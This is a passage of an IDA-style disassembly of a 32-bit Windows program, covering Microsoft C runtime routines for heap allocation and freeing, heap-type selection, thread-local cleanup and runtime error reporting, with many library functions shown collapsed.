		jmp	ds:wsprintfA
; [0000000E BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD CTRL-"+"	TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_402196	proc near		; CODE XREF: sub_401270+A8p
					; sub_401270+EDp

lpMem		= dword	ptr  4

		push	[esp+lpMem]	; lpMem
		call	sub_402821
		pop	ecx
		retn
sub_402196	endp

; [0000002D BYTES: COLLAPSED FUNCTION _JumpToContinuation(void *,EHRegistrationNode *).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
; [00000007 BYTES: COLLAPSED FUNCTION sub_4021D5. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000007 BYTES: COLLAPSED FUNCTION sub_4021DC. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000007 BYTES: COLLAPSED FUNCTION sub_4021E3. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000004F BYTES: COLLAPSED FUNCTION _UnwindNestedFrames(EHRegistrationNode *,EHExceptionRecord *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION ___CxxFrameHandler. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __CxxLongjmpUnwind(x). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000054 BYTES: COLLAPSED FUNCTION _CallCatchBlock2(EHRegistrationNode *,_s_FuncInfo	const *,void *,int,ulong). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000025 BYTES: COLLAPSED FUNCTION CatchGuardHandler(EHExceptionRecord *,CatchGuardRN *,void	*,void *). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [000000B6 BYTES: COLLAPSED FUNCTION _CallSETranslator(EHExceptionRecord *,EHRegistrationNode *,void *,void *,_s_FuncInfo const *,int,EHRegistrationNode *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION TranslatorGuardHandler(EHExceptionRecord *,TranslatorGuardRN *,void *,void *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION _GetRangeOfTrysToCheck(_s_FuncInfo const *,int,int,uint *,uint *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __unwind_handler.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __NLG_Notify1. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000108 BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		pop	ecx
		pop	ecx
		retn
; [00000023 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		retn
; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD	CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_402725	proc near		; CODE XREF: __nh_malloc+Bp

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
arg_0		= dword	ptr  8

; FUNCTION CHUNK AT 00402795 SIZE 0000008C BYTES

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset stru_411010
		push	offset __except_handler3
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	eax, dword_43DBA8
		cmp	eax, 3
		jnz	short loc_402795
		mov	esi, [ebp+arg_0]
		cmp	esi, dword_43DB94
		ja	loc_4027F4
		push	9
		call	__lock
		pop	ecx
		and	[ebp+ms_exc.registration.TryLevel], 0
		push	esi
		call	___sbh_alloc_block
		pop	ecx
		mov	[ebp+var_1C], eax
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_40278C	; Finally handler 0 for	function 402725
; ---------------------------------------------------------------------------

loc_402780:				; CODE XREF: sub_402725+6Fj
		mov	eax, [ebp+var_1C]
		test	eax, eax
		jz	short loc_4027F4
		jmp	loc_402812
; ---------------------------------------------------------------------------

loc_40278C:				; CODE XREF: sub_402725+56j
					; DATA XREF: .rdata:stru_411010o
		push	9		; Finally handler 0 for	function 402725
		call	__unlock
		pop	ecx
		retn
sub_402725	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_402725

loc_402795:				; CODE XREF: sub_402725+2Bj
		cmp	eax, 2
		jnz	short loc_4027F4
		mov	eax, [ebp+arg_0]
		test	eax, eax
		jz	short loc_4027A9
		lea	esi, [eax+0Fh]
		and	esi, 0FFFFFFF0h
		jmp	short loc_4027AC
; ---------------------------------------------------------------------------

loc_4027A9:				; CODE XREF: sub_402725+7Aj
		push	10h
		pop	esi

loc_4027AC:				; CODE XREF: sub_402725+82j
		mov	[ebp+arg_0], esi
		cmp	esi, dword_43BA0C
		ja	short loc_4027E5
		push	9
		call	__lock
		pop	ecx
		mov	[ebp+ms_exc.registration.TryLevel], 1
		mov	eax, esi
		shr	eax, 4
		push	eax
		call	sub_4055C9
		pop	ecx
		mov	[ebp+var_1C], eax
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_4027EB
; ---------------------------------------------------------------------------

loc_4027DE:				; CODE XREF: sub_402725+CEj
		mov	eax, [ebp+var_1C]
		test	eax, eax
		jnz	short loc_402812

loc_4027E5:				; CODE XREF: sub_402725+90j
		push	esi
		jmp	short loc_402804
; ---------------------------------------------------------------------------

loc_4027E8:				; DATA XREF: .rdata:stru_411010o
		mov	esi, [ebp+arg_0] ; Finally handler 1 for function 402725

loc_4027EB:				; CODE XREF: sub_402725+B4j
		push	9
		call	__unlock
		pop	ecx
		retn
; ---------------------------------------------------------------------------

loc_4027F4:				; CODE XREF: sub_402725+36j
					; sub_402725+60j ...
		mov	eax, [ebp+arg_0]
		test	eax, eax
		jnz	short loc_4027FE
		push	1
		pop	eax

loc_4027FE:				; CODE XREF: sub_402725+D4j
		add	eax, 0Fh
		and	al, 0F0h
		push	eax		; dwBytes

loc_402804:				; CODE XREF: sub_402725+C1j
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc

loc_402812:				; CODE XREF: sub_402725+62j
					; sub_402725+BEj
		mov	ecx, [ebp+ms_exc.registration.Next]
		mov	large fs:0, ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; END OF FUNCTION CHUNK	FOR sub_402725

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_402821(LPVOID	lpMem)
sub_402821	proc near		; CODE XREF: sub_402196+4p
					; .text:00403294p ...

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
lpMem		= dword	ptr  8

; FUNCTION CHUNK AT 00402894 SIZE 00000076 BYTES

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset stru_411028
		push	offset __except_handler3
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 18h
		push	ebx
		push	esi
		push	edi
		mov	esi, [ebp+lpMem]
		test	esi, esi
		jz	loc_4028FB
		mov	eax, dword_43DBA8
		cmp	eax, 3
		jnz	short loc_402894
		push	9
		call	__lock
		pop	ecx
		and	[ebp+ms_exc.registration.TryLevel], 0
		push	esi
		call	___sbh_find_block
		pop	ecx
		mov	[ebp+var_1C], eax
		test	eax, eax
		jz	short loc_40287C
		push	esi
		push	eax
		call	sub_4043DB
		pop	ecx
		pop	ecx

loc_40287C:				; CODE XREF: sub_402821+50j
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_40288B	; Finally handler 0 for	function 402821
; ---------------------------------------------------------------------------

loc_402885:				; CODE XREF: sub_402821+72j
		cmp	[ebp+var_1C], 0
		jmp	short loc_4028DC
; ---------------------------------------------------------------------------

loc_40288B:				; CODE XREF: sub_402821+5Fj
					; DATA XREF: .rdata:stru_411028o
		push	9		; Finally handler 0 for	function 402821
		call	__unlock
		pop	ecx
		retn
sub_402821	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_402821

loc_402894:				; CODE XREF: sub_402821+36j
		cmp	eax, 2
		jnz	short loc_4028EC
		push	9
		call	__lock
		pop	ecx
		mov	[ebp+ms_exc.registration.TryLevel], 1
		lea	eax, [ebp+var_20]
		push	eax
		lea	eax, [ebp+var_28]
		push	eax
		push	esi
		call	sub_40552D
		add	esp, 0Ch
		mov	[ebp+var_24], eax
		test	eax, eax
		jz	short loc_4028CF
		push	eax
		push	[ebp+var_20]
		push	[ebp+var_28]
		call	sub_405584
		add	esp, 0Ch

loc_4028CF:				; CODE XREF: sub_402821+9Dj
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_4028E3	; Finally handler 1 for	function 402821
; ---------------------------------------------------------------------------

loc_4028D8:				; CODE XREF: sub_402821+CAj
		cmp	[ebp+var_24], 0

loc_4028DC:				; CODE XREF: sub_402821+68j
		jnz	short loc_4028FB
		push	[ebp+lpMem]
		jmp	short loc_4028ED
; ---------------------------------------------------------------------------

loc_4028E3:				; CODE XREF: sub_402821+B2j
					; DATA XREF: .rdata:stru_411028o
		push	9		; Finally handler 1 for	function 402821
		call	__unlock
		pop	ecx
		retn
; ---------------------------------------------------------------------------

loc_4028EC:				; CODE XREF: sub_402821+76j
		push	esi		; lpMem

loc_4028ED:				; CODE XREF: sub_402821+C0j
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapFree

loc_4028FB:				; CODE XREF: sub_402821+28j
					; sub_402821:loc_4028DCj
		mov	ecx, [ebp+ms_exc.registration.Next]
		mov	large fs:0, ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; END OF FUNCTION CHUNK	FOR sub_402821
; [0000009B BYTES: COLLAPSED FUNCTION ___InternalCxxFrameHandler. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000001B3 BYTES: COLLAPSED FUNCTION FindHandler(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,void *,_s_FuncInfo const *,uchar,int,EHRegistrationNode *). PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000AA BYTES: COLLAPSED FUNCTION FindHandlerForForeignException(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,void *,_s_FuncInfo const *,int,int,EHRegistrationNode *). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000005D BYTES: COLLAPSED FUNCTION TypeMatch(_s_HandlerType const *,_s_CatchableType	const *,_s_ThrowInfo const *). PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000009E BYTES: COLLAPSED FUNCTION ___FrameUnwindToState. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION CatchIt(EHExceptionRecord	*,EHRegistrationNode *,_CONTEXT	*,void *,_s_FuncInfo const *,_s_HandlerType const *,_s_CatchableType const *,_s_TryBlockMapEntry const *,int,EHRegistrationNode	*,uchar). PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000C7 BYTES: COLLAPSED FUNCTION CallCatchBlock(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,_s_FuncInfo const *,void *,int,ulong).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [00000054 BYTES: COLLAPSED CHUNK OF FUNCTION CallCatchBlock(EHExceptionRecord	*,EHRegistrationNode *,_CONTEXT	*,_s_FuncInfo const *,void *,int,ulong). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002A BYTES: COLLAPSED FUNCTION ExFilterRethrow(_EXCEPTION_POINTERS *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001C4 BYTES: COLLAPSED FUNCTION BuildCatchObject(EHExceptionRecord *,EHRegistrationNode *,_s_HandlerType const *,_s_CatchableType	const *). PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000067 BYTES: COLLAPSED FUNCTION unknown_libname_2. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION AdjustPointer(void *,PMD const &). PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000004C BYTES: COLLAPSED FUNCTION _CallSettingFrame(x,x,x).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000054 BYTES: COLLAPSED FUNCTION __mtinit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__mtterm:
		call	__mtdeletelocks
		mov	eax, dwTlsIndex
		cmp	eax, 0FFFFFFFFh
		jz	short locret_4031ED
		push	eax
		call	ds:TlsFree
		or	dwTlsIndex, 0FFFFFFFFh

locret_4031ED:				; CODE XREF: .text:004031DDj
		retn
; [00000013 BYTES: COLLAPSED FUNCTION __initptd. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000067 BYTES: COLLAPSED FUNCTION __getptd.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__freeptd:
		mov	eax, dwTlsIndex
		cmp	eax, 0FFFFFFFFh
		jz	locret_403307
		push	esi
		mov	esi, [esp+8]
		test	esi, esi
		jnz	short loc_40328C
		push	eax
		call	ds:TlsGetValue
		mov	esi, eax
		test	esi, esi
		jz	short loc_4032F8

loc_40328C:				; CODE XREF: .text:0040327Dj
		mov	eax, [esi+24h]
		test	eax, eax
		jz	short loc_40329A
		push	eax
		call	sub_402821
		pop	ecx

loc_40329A:				; CODE XREF: .text:00403291j
		mov	eax, [esi+28h]
		test	eax, eax
		jz	short loc_4032A8
		push	eax
		call	sub_402821
		pop	ecx

loc_4032A8:				; CODE XREF: .text:0040329Fj
		mov	eax, [esi+30h]
		test	eax, eax
		jz	short loc_4032B6
		push	eax
		call	sub_402821
		pop	ecx

loc_4032B6:				; CODE XREF: .text:004032ADj
		mov	eax, [esi+38h]
		test	eax, eax
		jz	short loc_4032C4
		push	eax
		call	sub_402821
		pop	ecx

loc_4032C4:				; CODE XREF: .text:004032BBj
		mov	eax, [esi+40h]
		test	eax, eax
		jz	short loc_4032D2
		push	eax
		call	sub_402821
		pop	ecx

loc_4032D2:				; CODE XREF: .text:004032C9j
		mov	eax, [esi+44h]
		test	eax, eax
		jz	short loc_4032E0
		push	eax
		call	sub_402821
		pop	ecx

loc_4032E0:				; CODE XREF: .text:004032D7j
		mov	eax, [esi+50h]
		cmp	eax, offset dword_4398A8
		jz	short loc_4032F1
		push	eax
		call	sub_402821
		pop	ecx

loc_4032F1:				; CODE XREF: .text:004032E8j
		push	esi
		call	sub_402821
		pop	ecx

loc_4032F8:				; CODE XREF: .text:0040328Aj
		push	0
		push	dwTlsIndex
		call	ds:TlsSetValue
		pop	esi

locret_403307:				; CODE XREF: .text:00403270j
		retn
; ---------------------------------------------------------------------------
		jmp	ds:GetCurrentThreadId
; ---------------------------------------------------------------------------
		jmp	ds:GetCurrentThread
; [00000061 BYTES: COLLAPSED FUNCTION terminate(void). PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION unexpected(void).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000056 BYTES: COLLAPSED FUNCTION sub_40338D. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000000F BYTES: COLLAPSED FUNCTION __cexit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000000F BYTES: COLLAPSED FUNCTION __c_exit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000A3 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; ---------------------------------------------------------------------------
		pop	edi
		retn
; [00000009 BYTES: COLLAPSED FUNCTION __lockexit. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __unlockexit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000013E BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000003A BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __wincmdln. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001BC BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__ioterm:
		push	ebx
		push	esi
		push	edi
		mov	esi, offset dword_43DBC0

loc_403CED:				; CODE XREF: .text:00403D33j
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_403D2A
		mov	edi, eax
		add	eax, 480h
		cmp	edi, eax
		jnb	short loc_403D1F
		lea	ebx, [edi+0Ch]

loc_403D01:				; CODE XREF: .text:00403D1Dj
		cmp	dword ptr [ebx-4], 0
		jz	short loc_403D0E
		push	ebx
		call	ds:DeleteCriticalSection

loc_403D0E:				; CODE XREF: .text:00403D05j
		mov	eax, [esi]
		add	edi, 24h
		add	eax, 480h
		add	ebx, 24h
		cmp	edi, eax
		jb	short loc_403D01

loc_403D1F:				; CODE XREF: .text:00403CFCj
		push	dword ptr [esi]
		call	sub_402821
		and	dword ptr [esi], 0
		pop	ecx

loc_403D2A:				; CODE XREF: .text:00403CF1j
		add	esi, 4
		cmp	esi, offset dword_43DCC0
		jl	short loc_403CED
		pop	edi
		pop	esi
		pop	ebx
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403D39	proc near		; CODE XREF: sub_403D66+136p
					; .text:00404306p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		push	0		; lpModuleName
		and	dword ptr [esi], 0
		call	ds:GetModuleHandleA
		cmp	word ptr [eax],	5A4Dh
		jnz	short loc_403D64
		mov	ecx, [eax+3Ch]
		test	ecx, ecx
		jz	short loc_403D64
		add	eax, ecx
		mov	cl, [eax+1Ah]
		mov	[esi], cl
		mov	al, [eax+1Bh]
		mov	[esi+1], al

loc_403D64:				; CODE XREF: sub_403D39+15j
					; sub_403D39+1Cj
		pop	esi
		retn
sub_403D39	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403D66	proc near		; CODE XREF: sub_403EAE+20p

Buffer		= byte ptr -122Ch
Filename	= byte ptr -19Ch
VersionInformation= _OSVERSIONINFOA ptr	-98h
var_4		= byte ptr -4

		push	ebp
		mov	ebp, esp
		mov	eax, 122Ch
		call	__alloca_probe
		lea	eax, [ebp+VersionInformation]
		push	ebx
		push	eax		; lpVersionInformation
		mov	[ebp+VersionInformation.dwOSVersionInfoSize], 94h
		call	ds:GetVersionExA
		test	eax, eax
		jz	short loc_403DA9
		cmp	[ebp+VersionInformation.dwPlatformId], 2
		jnz	short loc_403DA9
		cmp	[ebp+VersionInformation.dwMajorVersion], 5
		jb	short loc_403DA9
		push	1
		pop	eax
		jmp	loc_403EAB
; ---------------------------------------------------------------------------

loc_403DA9:				; CODE XREF: sub_403D66+27j
					; sub_403D66+30j ...
		lea	eax, [ebp+Buffer]
		push	1090h		; nSize
		push	eax		; lpBuffer
		push	offset Name	; "__MSVCRT_HEAP_SELECT"
		call	ds:GetEnvironmentVariableA
		test	eax, eax
		jz	loc_403E98
		xor	ebx, ebx
		lea	ecx, [ebp+Buffer]
		cmp	[ebp+Buffer], bl
		jz	short loc_403DEB

loc_403DD8:				; CODE XREF: sub_403D66+83j
		mov	al, [ecx]
		cmp	al, 61h
		jl	short loc_403DE6
		cmp	al, 7Ah
		jg	short loc_403DE6
		sub	al, 20h
		mov	[ecx], al

loc_403DE6:				; CODE XREF: sub_403D66+76j
					; sub_403D66+7Aj
		inc	ecx
		cmp	[ecx], bl
		jnz	short loc_403DD8

loc_403DEB:				; CODE XREF: sub_403D66+70j
		lea	eax, [ebp+Buffer]
		push	16h		; size_t
		push	eax		; char *
		push	offset a__global_heap_ ; "__GLOBAL_HEAP_SELECTED"
		call	_strncmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_403E0D
		lea	eax, [ebp+Buffer]
		jmp	short loc_403E56
; ---------------------------------------------------------------------------

loc_403E0D:				; CODE XREF: sub_403D66+9Dj
		lea	eax, [ebp+Filename]
		push	104h		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		cmp	[ebp+Filename],	bl
		lea	ecx, [ebp+Filename]
		jz	short loc_403E41

loc_403E2E:				; CODE XREF: sub_403D66+D9j
		mov	al, [ecx]
		cmp	al, 61h
		jl	short loc_403E3C
		cmp	al, 7Ah
		jg	short loc_403E3C
		sub	al, 20h
		mov	[ecx], al

loc_403E3C:				; CODE XREF: sub_403D66+CCj
					; sub_403D66+D0j
		inc	ecx
		cmp	[ecx], bl
		jnz	short loc_403E2E

loc_403E41:				; CODE XREF: sub_403D66+C6j
		lea	eax, [ebp+Filename]
		push	eax		; char *
		lea	eax, [ebp+Buffer]
		push	eax		; char *
		call	_strstr
		pop	ecx
		pop	ecx

loc_403E56:				; CODE XREF: sub_403D66+A5j
		cmp	eax, ebx
		jz	short loc_403E98
		push	2Ch		; int
		push	eax		; char *
		call	_strchr
		pop	ecx
		cmp	eax, ebx
		pop	ecx
		jz	short loc_403E98
		inc	eax
		mov	ecx, eax
		cmp	[eax], bl
		jz	short loc_403E7D

loc_403E6F:				; CODE XREF: sub_403D66+115j
		cmp	byte ptr [ecx],	3Bh
		jnz	short loc_403E78
		mov	[ecx], bl
		jmp	short loc_403E79
; ---------------------------------------------------------------------------

loc_403E78:				; CODE XREF: sub_403D66+10Cj
		inc	ecx

loc_403E79:				; CODE XREF: sub_403D66+110j
		cmp	[ecx], bl
		jnz	short loc_403E6F

loc_403E7D:				; CODE XREF: sub_403D66+107j
		push	0Ah		; int
		push	ebx		; char **
		push	eax		; char *
		call	_strtol
		add	esp, 0Ch
		cmp	eax, 2
		jz	short loc_403EAB
		cmp	eax, 3
		jz	short loc_403EAB
		cmp	eax, 1
		jz	short loc_403EAB

loc_403E98:				; CODE XREF: sub_403D66+5Cj
					; sub_403D66+F2j ...
		lea	eax, [ebp+var_4]
		push	eax
		call	sub_403D39
		cmp	[ebp+var_4], 6
		pop	ecx
		sbb	eax, eax
		add	eax, 3

loc_403EAB:				; CODE XREF: sub_403D66+3Ej
					; sub_403D66+126j ...
		pop	ebx
		leave
		retn
sub_403D66	endp


; =============== S U B	R O U T	I N E =======================================


sub_403EAE	proc near		; CODE XREF: start+59p

arg_0		= dword	ptr  4

		xor	eax, eax
		push	0		; dwMaximumSize
		cmp	[esp+4+arg_0], eax
		push	1000h		; dwInitialSize
		setz	al
		push	eax		; flOptions
		call	ds:HeapCreate
		test	eax, eax
		mov	hHeap, eax
		jz	short loc_403F04
		call	sub_403D66
		cmp	eax, 3
		mov	dword_43DBA8, eax
		jnz	short loc_403EEA
		push	3F8h
		call	___sbh_heap_init
		pop	ecx
		jmp	short loc_403EF4
; ---------------------------------------------------------------------------

loc_403EEA:				; CODE XREF: sub_403EAE+2Dj
		cmp	eax, 2
		jnz	short loc_403F07
		call	sub_4052D1

loc_403EF4:				; CODE XREF: sub_403EAE+3Aj
		test	eax, eax
		jnz	short loc_403F07
		push	hHeap		; hHeap
		call	ds:HeapDestroy

loc_403F04:				; CODE XREF: sub_403EAE+1Ej
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_403F07:				; CODE XREF: sub_403EAE+3Fj
					; sub_403EAE+48j
		push	1
		pop	eax
		retn
sub_403EAE	endp

; ---------------------------------------------------------------------------
		mov	eax, dword_43DBA8
		push	esi
		cmp	eax, 3
		push	edi
		jnz	short loc_403F7D
		push	ebx
		xor	ebx, ebx
		cmp	dword_43DB8C, ebx
		push	ebp
		mov	ebp, ds:HeapFree
		jle	short loc_403F69
		mov	eax, lp
		mov	edi, ds:VirtualFree
		lea	esi, [eax+0Ch]

loc_403F37:				; CODE XREF: .text:00403F67j
		push	4000h
		push	100000h
		push	dword ptr [esi]
		call	edi ; VirtualFree
		push	8000h
		push	0
		push	dword ptr [esi]
		call	edi ; VirtualFree
		push	dword ptr [esi+4]
		push	0
		push	hHeap
		call	ebp ; HeapFree
		add	esi, 14h
		inc	ebx
		cmp	ebx, dword_43DB8C
		jl	short loc_403F37

loc_403F69:				; CODE XREF: .text:00403F27j
		push	lp
		push	0
		push	hHeap
		call	ebp ; HeapFree
		pop	ebp
		pop	ebx
		jmp	short loc_403FA4
; ---------------------------------------------------------------------------

loc_403F7D:				; CODE XREF: .text:00403F15j
		cmp	eax, 2
		jnz	short loc_403FA4
		mov	edi, offset off_4399E8
		mov	esi, edi

loc_403F89:				; CODE XREF: .text:00403FA2j
		mov	eax, [esi+10h]
		test	eax, eax
		jz	short loc_403F9E
		push	8000h
		push	0
		push	eax
		call	ds:VirtualFree

loc_403F9E:				; CODE XREF: .text:00403F8Ej
		mov	esi, [esi]
		cmp	esi, edi
		jnz	short loc_403F89

loc_403FA4:				; CODE XREF: .text:00403F7Bj
					; .text:00403F80j
		push	hHeap
		call	ds:HeapDestroy
		pop	edi
		pop	esi
		retn
; ---------------------------------------------------------------------------
		align 4
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION __except_handler3. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION _seh_longjmp_unwind(x). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4040CD(DWORD NumberOfBytesWritten)
sub_4040CD	proc near		; CODE XREF: __amsg_exit+12p
					; _fast_error_exit+12p	...

Filename	= byte ptr -1A4h
var_A0		= byte ptr -0A0h
NumberOfBytesWritten= dword ptr	 8

		push	ebp
		mov	ebp, esp
		sub	esp, 1A4h
		mov	edx, [ebp+NumberOfBytesWritten]
		xor	ecx, ecx
		mov	eax, offset dword_439958

loc_4040E0:				; CODE XREF: sub_4040CD+20j
		cmp	edx, [eax]
		jz	short loc_4040EF
		add	eax, 8
		inc	ecx
		cmp	eax, offset off_4399E8
		jb	short loc_4040E0

loc_4040EF:				; CODE XREF: sub_4040CD+15j
		push	esi
		mov	esi, ecx
		shl	esi, 3
		cmp	edx, dword_439958[esi]
		jnz	loc_40421D
		mov	eax, dword_43D550
		cmp	eax, 1
		jz	loc_4041F7
		test	eax, eax
		jnz	short loc_404120
		cmp	dword_439898, 1
		jz	loc_4041F7

loc_404120:				; CODE XREF: sub_4040CD+44j
		cmp	edx, 0FCh
		jz	loc_40421D
		lea	eax, [ebp+Filename]
		push	104h		; nSize
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		test	eax, eax
		jnz	short loc_404157
		lea	eax, [ebp+Filename]
		push	offset aProgramNameUnk ; "<program name	unknown>"
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_404157:				; CODE XREF: sub_4040CD+75j
		lea	eax, [ebp+Filename]
		push	edi
		push	eax		; char *
		lea	edi, [ebp+Filename]
		call	_strlen
		inc	eax
		pop	ecx
		cmp	eax, 3Ch
		jbe	short loc_40419A
		lea	eax, [ebp+Filename]
		push	eax		; char *
		call	_strlen
		mov	edi, eax
		lea	eax, [ebp+Filename]
		sub	eax, 3Bh
		push	3		; size_t
		add	edi, eax
		push	offset a___	; "..."
		push	edi		; char *
		call	_strncpy
		add	esp, 10h

loc_40419A:				; CODE XREF: sub_4040CD+A2j
		lea	eax, [ebp+var_A0]
